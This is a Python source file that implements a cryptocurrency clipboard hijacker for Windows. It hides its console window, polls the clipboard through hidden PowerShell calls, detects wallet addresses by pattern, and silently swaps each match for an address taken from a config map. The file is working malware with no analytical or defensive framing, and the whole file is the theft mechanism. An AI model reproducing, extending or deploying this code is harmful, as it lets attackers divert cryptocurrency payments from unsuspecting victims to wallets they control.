import time, subprocess, ctypes
from config import w, interval, hide_console
from utils.regex import identify

def _gc():
    try:
        r = subprocess.run(["powershell","-NoProfile","-Command","Get-Clipboard"],
            capture_output=True, text=True, timeout=3,
            creationflags=0x08000000)
        return r.stdout.strip()
    except: return ""

def _sc(t):
    try:
        subprocess.run(["powershell","-NoProfile","-Command",
            f"Set-Clipboard -Value '{t.replace(chr(39), chr(39)+chr(39))}'"],
            capture_output=True, timeout=3,
            creationflags=0x08000000)
    except: pass

def _hc():
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(), 0)

def run():
    if hide_console: _hc()
    lc = ""
    while True:
        try:
            cur = _gc()
            if cur and cur != lc:
                lc = cur
                coin, m = identify(cur)
                if coin and coin in w:
                    orig = m.group(0)
                    rep = w[coin]
                    if orig != rep:
                        nc = cur.replace(orig, rep)
                        _sc(nc)
                        lc = nc
            time.sleep(interval)
        except KeyboardInterrupt: break
        except: time.sleep(interval)
